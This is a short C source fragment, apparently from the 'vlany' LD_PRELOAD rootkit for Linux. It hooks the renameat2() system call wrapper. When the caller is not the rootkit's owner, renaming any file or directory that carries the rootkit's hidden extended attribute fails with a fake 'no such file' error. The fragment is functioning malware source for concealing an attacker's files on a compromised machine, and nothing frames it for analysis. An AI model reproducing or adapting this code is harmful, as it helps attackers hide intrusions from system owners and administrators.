int renameat2(int olddirfd, const char *oldpath, int newdirfd, const char *newpath, unsigned int flags)
{
    #ifdef DEBUG
        printf("[vlany] renameat2() called\n");
    #endif

    HOOK(old_renameat2, CRENAMEAT2);

    if(owned()) return old_renameat2(olddirfd, oldpath, newdirfd, newpath, flags);

    if(hidden_xattr(oldpath) || hidden_xattr(newpath) || hidden_fxattr(olddirfd) || hidden_fxattr(newdirfd)) { errno = ENOENT; return -1; }

    return old_renameat2(olddirfd, oldpath, newdirfd, newpath, flags);
}
